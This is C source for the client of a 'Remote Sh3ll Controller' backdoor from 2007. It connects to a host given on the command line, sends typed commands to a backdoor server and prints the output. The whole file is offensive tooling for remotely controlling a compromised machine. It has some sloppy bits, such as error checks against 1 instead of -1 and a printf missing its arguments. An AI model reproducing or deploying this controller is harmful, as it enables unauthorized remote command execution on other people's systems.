#include "backdoor.h"
int main(int argc, char** argv) {   
int sd,i;
char *buff, cmd[1000], size[17];
struct sockaddr_in client, server;
if (argc==1) {
printf ("Please give me a valid host to connect\n");
exit(0);
}
addr_init(&server, PORT, inet_addr(argv[1]));
sd = socket(AF_INET, SOCK_STREAM, 0);
if (sd==1) {
printf ("Unable to create a socket\n");
exit(1);
}
if ( connect(sd, (struct sockaddr*) &server, sizeof(struct sockaddr)) )
{
printf ("Unable to connect to the server%s\n",inet_ntoa(server.sin_addr));
close(sd);
exit(2);
}
printf("__________________________\n");
printf("Remote Sh3ll Controller\n\n");
printf("by BlackLight, (C) 2007\n");
printf("blacklight86@gmail.com\n");
printf("Released under GPL licence\n");
printf("__________________________\n\n");
printf("Connection successfully established on the port %d of server%s\n\n");//,ntohs(server.sin_port), inet_ntoa(server.sin_addr));
for (;;) {
printf ("my­sh3ll­prompt# ");
fgets(cmd, sizeof(cmd), stdin);
cmd[strlen(cmd)-1] = '\0';
write(sd, cmd, sizeof(cmd));
memset(cmd, 0x0, sizeof(cmd));
if ( (read(sd, size, sizeof(size))) == 1) {
printf ("Unable to receive data from the server %s.Connection lost\n",inet_ntoa(server.sin_addr));
exit(1);
}

buff = (char*) malloc(atoi(size)*sizeof(char));
if ( (read(sd, buff, atoi(size))) == 1) {
printf ("Unable to receive data from the server %s.Connection lost\n",inet_ntoa(server.sin_addr));
exit(1);
}
printf ("%s",buff);
printf ("\nCommand successfully sent\n");
}
close(sd);
}
